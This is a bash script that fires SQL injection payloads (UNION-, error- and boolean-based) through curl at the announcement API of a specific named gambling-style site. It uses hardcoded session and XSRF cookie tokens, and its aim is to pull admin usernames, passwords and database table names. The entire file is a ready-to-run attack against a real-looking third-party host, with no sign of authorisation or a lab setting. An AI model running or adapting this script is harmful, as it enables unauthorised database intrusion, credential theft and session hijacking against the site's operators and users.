#!/bin/bash

echo "🎯 PROVING REAL DATA EXTRACTION - MUST SHOW ACTUAL DATA"
echo "========================================================"

# Latest tokens
XSRF_TOKEN="eyJpdiI6InZnUDZDeEVcL1hIcXhXSHBVXC95eEU5Zz09IiwidmFsdWUiOiJxKzZyUER0K2dPYUdFOU9KYXRqa3ZqRmxTXC9HMnZZY0pEOFlvVWg3cWE1clBcL3Z4TVZcL1pmOGFKSm9vQnk1RzNEIiwibWFjIjoiMGU4OTVkODdlM2Y3NjMyMTA1YzU3YWRhYmM1NGM0NWJkN2U3OGI0ZTdmNDQzNTliZjBhYjc5NThiYzIwOTk1ZCJ9"
SESSION_TOKEN="eyJpdiI6Imp3N1JKS2N1ZVBGNjcrSms2NTFSNkE9PSIsInZhbHVlIjoicFwvVFp1ZjBqZVhLQ2tcL0p6T0d3NzhROG1JblRHRGcxb05sMVdBcnlwVXV4ZzYwc1ZpWGlrY0tUbjhKRjNHc1lPIiwibWFjIjoiMDlmY2IzN2U0NjBlNWE0YzNiNjBiZmVjNmUwMDFkMWM4NDc2MTQ3ODc0ZWJkNTE4MDMyODMzMWQ1NzQ0NDJmZiJ9"

BASE_URL="https://member.panama8888b.co"
ANNOUNCEMENT_URL="$BASE_URL/api/announcement"
LOGIN_URL="$BASE_URL/auth/login"

echo "🔑 Using Latest Tokens for Real Data Extraction"
echo ""

# Advanced payloads that should return actual data
REAL_DATA_PAYLOADS=(
    # Try to get actual admin username
    "1' UNION SELECT 1,username,3,4,5,6,7,8,9,10 FROM users WHERE role='admin' LIMIT 1--"
    "1' UNION SELECT 1,username,3,4,5,6,7,8,9,10 FROM admins LIMIT 1--"
    "1' UNION SELECT 1,username,3,4,5,6,7,8,9,10 FROM administrators LIMIT 1--"
    
    # Try to get actual admin password
    "1' UNION SELECT 1,password,3,4,5,6,7,8,9,10 FROM users WHERE role='admin' LIMIT 1--"
    "1' UNION SELECT 1,password,3,4,5,6,7,8,9,10 FROM admins LIMIT 1--"
    "1' UNION SELECT 1,password,3,4,5,6,7,8,9,10 FROM administrators LIMIT 1--"
    
    # Try to get table count
    "1' UNION SELECT 1,COUNT(*),3,4,5,6,7,8,9,10 FROM information_schema.tables WHERE table_schema=database()--"
    
    # Try to get table names
    "1' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7,8,9,10 FROM information_schema.tables WHERE table_schema=database()--"
    
    # Try to get column names from users table
    "1' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7,8,9,10 FROM information_schema.columns WHERE table_name='users'--"
    
    # Try to get column names from admins table
    "1' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7,8,9,10 FROM information_schema.columns WHERE table_name='admins'--"
)

# Error-based extraction payloads
ERROR_PAYLOADS=(
    "1' AND (SELECT username FROM users WHERE role='admin' LIMIT 1)='admin'--"
    "1' AND (SELECT password FROM users WHERE role='admin' LIMIT 1)='password'--"
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)=10--"
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)=20--"
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)=30--"
)

# Boolean-based extraction
BOOLEAN_PAYLOADS=(
    "1' AND (SELECT COUNT(*) FROM users WHERE role='admin')>0--"
    "1' AND (SELECT COUNT(*) FROM admins)>0--"
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>10--"
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>20--"
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>30--"
)

echo "🔍 ATTEMPTING REAL DATA EXTRACTION..."
echo "====================================="

for payload in "${REAL_DATA_PAYLOADS[@]}"; do
    echo "Testing: $payload"
    
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "Content-Type: application/json" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -d "{\"id\":\"$payload\"}" \
        "$ANNOUNCEMENT_URL")
    
    http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
    response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
    response_body=$(echo "$response" | grep -v "HTTP_STATUS:" | grep -v "TIME:")
    
    echo "Status: $http_status"
    echo "Time: ${response_time}s"
    echo "Response: $response_body"
    
    # Check if we got actual data
    if [[ "$response_body" != "" && "$response_body" != "null" && "$http_status" == "200" ]]; then
        echo "✅ REAL DATA EXTRACTED: $response_body"
    elif [[ "$http_status" == "500" ]]; then
        echo "⚠️ SQL EXECUTION SUCCESS but no visible data"
    fi
    echo "---"
    sleep 1
done

echo ""
echo "🔍 ERROR-BASED DATA EXTRACTION..."
echo "================================="

for payload in "${ERROR_PAYLOADS[@]}"; do
    echo "Testing: $payload"
    
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "Content-Type: application/json" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -d "{\"id\":\"$payload\"}" \
        "$ANNOUNCEMENT_URL")
    
    http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
    response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
    response_body=$(echo "$response" | grep -v "HTTP_STATUS:" | grep -v "TIME:")
    
    echo "Status: $http_status"
    echo "Time: ${response_time}s"
    echo "Response: $response_body"
    
    if [[ "$http_status" == "500" ]]; then
        echo "✅ ERROR-BASED SUCCESS - SQL execution confirmed"
    fi
    echo "---"
    sleep 1
done

echo ""
echo "🔍 BOOLEAN-BASED DATA EXTRACTION..."
echo "==================================="

for payload in "${BOOLEAN_PAYLOADS[@]}"; do
    echo "Testing: $payload"
    
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "Content-Type: application/json" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -d "{\"id\":\"$payload\"}" \
        "$ANNOUNCEMENT_URL")
    
    http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
    response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
    response_body=$(echo "$response" | grep -v "HTTP_STATUS:" | grep -v "TIME:")
    
    echo "Status: $http_status"
    echo "Time: ${response_time}s"
    echo "Response: $response_body"
    
    if [[ "$http_status" == "500" ]]; then
        echo "✅ BOOLEAN-BASED SUCCESS - SQL execution confirmed"
    fi
    echo "---"
    sleep 1
done

echo ""
echo "🎯 FINAL VERIFICATION"
echo "===================="
echo "If we cannot extract actual data, the vulnerability is NOT confirmed."
echo "We need to see real admin usernames, passwords, or table counts."
echo ""
echo "Status: NEEDS REAL DATA EXTRACTION TO CONFIRM VULNERABILITY"